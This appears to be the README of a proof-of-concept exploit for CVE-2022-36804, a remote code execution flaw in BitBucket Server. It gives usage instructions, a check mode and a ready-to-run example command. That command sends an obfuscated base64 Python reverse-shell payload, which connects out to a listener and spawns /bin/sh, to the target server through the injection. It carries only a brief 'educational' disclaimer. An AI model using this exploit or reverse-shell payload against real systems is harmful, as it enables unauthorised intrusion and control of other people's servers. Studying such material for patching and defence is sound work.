# CVE-2022-36804 PoC
This repo contains a simple proof of concept exploit for the recent [BitBucket remote code execution vulnerability (CVE-2022-36804)](https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html). Exploitation of this vulnerability requires access to a repository on the target instance, if you don't have creds, the target will need to have public respositories. 

# Usage
```
usage: exploit.py [-h] -p PROJECT -r REPO -u URL [-c COMMAND] [--proxy PROXY] [--session SESSION]
                  [--check]

Exploits the CVE-2022-36804 RCE in vulnerable BitBucket instances (< v8.3.1)

optional arguments:
  -h, --help            show this help message and exit
  -p PROJECT, --project PROJECT
                        The name of the project the public repository resides in (E.g.
                        testproject)
  -r REPO, --repo REPO  The name of the public repository (E.g. testrepo)
  -u URL, --url URL     The URL of the BitBucket server (E.g. http://localhost:7990/)
  -c COMMAND, --command COMMAND
                        The command to execute on the server (E.g. 'curl http://canary.domain/')
  --proxy PROXY         HTTP proxy to use for debugging (E.g. http://localhost:8080/)
  --session SESSION     The value of your 'BITBUCKETSESSIONID' cookie, required if your target
                        repo is private. (E.g. 3DD8B1EBA3763AD2611F4940BD870865)
  --check               Only perform a check to see if the instance is vulnerable
```

# Examples
## Checking if an instance is vulnerable
To check if an instance is vulnerable you can perform the following command
```
python3 exploit.py -p PROJECT -r REPO -u http://target.site/ --check
```

## Establishing a reverse shell
The below command can be used to establish a reverse shell on the victim (the base64 payload will need to updated with your listeners details)
```
python3 exploit.py -p PROJECT -r REPO -u http://localhost:7990/ -c "echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC42Ny4zIiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIikn' | base64 -d  | bash |"
```

# Credits
 - [TheGrandPew](https://github.com/TheGrandPew) - Identifying and reporting the bug
 
### Disclaimer
This exploit is for educational/research purposes, I am not responsible for how people will use it. Be nice :)
